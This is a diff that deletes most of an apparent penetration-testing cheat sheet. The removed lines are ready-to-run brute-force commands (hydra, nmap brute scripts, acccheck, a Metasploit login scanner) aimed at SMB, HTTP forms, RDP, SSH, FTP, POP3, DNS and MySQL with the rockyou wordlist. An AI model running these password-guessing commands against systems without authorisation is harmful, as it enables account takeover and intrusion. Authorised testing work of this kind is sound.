@@ -1,49 +1,4 @@
-## SMB bruteforece
-```
-nmap --script=smb-brute.nse 192.x.x.x
-nmap -sV -p 445 --script smb-brute 192.168.13.200-254
-acccheck -v -t 10.1.1.22 -u kevin -P /usr/share/wordlists/rockyou.txt
-```
-## HTTP bruteforce (forms)
-```
-hydra -l admin -P /root/ctf_wordlist.txt domain.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
-```
 
-## RDP bruteforce
-```
-hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://192.168.x.x
-```
-
-## SSH bruteforce
-```
-hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.13.234 ssh
-hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ssh
-hydra -t 4 -L /usr/share/wordlists/cristi.txt -p some_passsword 192.168.13.236 ssh
-hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 50000 ssh
-```
-
-## Bruteforce FTP
-```
-hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ftp
-use auxiliary/scanner/ftp/ftp_login
-```
-
-##Bruteforce POP3
-```
-hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop3
-```
-
-## DNS bruteforce
-```
-nmap -p 80 --script dns-brute.nse domain.com
-python dnscan.py -d domain.com -w ./subdomains-10000.txt
-```
-
-## MySQL bruteforce
-```
-nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv 192.168.31.139
- OR with hexorbase
-```
 
 ## SMTP brute force
 ```
